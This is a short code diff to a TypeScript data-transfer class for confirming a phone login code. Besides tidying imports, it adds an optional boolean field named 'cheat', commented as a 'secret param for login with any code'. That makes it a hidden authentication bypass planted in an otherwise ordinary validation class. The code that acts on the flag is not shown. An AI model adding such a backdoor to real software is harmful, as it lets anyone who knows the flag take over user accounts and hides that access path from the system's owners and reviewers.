@@ -1,4 +1,10 @@
-import { IsNotEmpty, IsNumber, IsString } from 'class-validator';
+import {
+  IsBoolean,
+  IsNotEmpty,
+  IsNumber,
+  IsOptional,
+  IsString,
+} from 'class-validator';
 
 export class ConfirmCodeDto {
   @IsNotEmpty()
@@ -7,4 +13,7 @@ export class ConfirmCodeDto {
   @IsNotEmpty()
   @IsString()
   phone: string;
+  @IsOptional()
+  @IsBoolean()
+  cheat?: boolean; // secret param for login with any code
 }
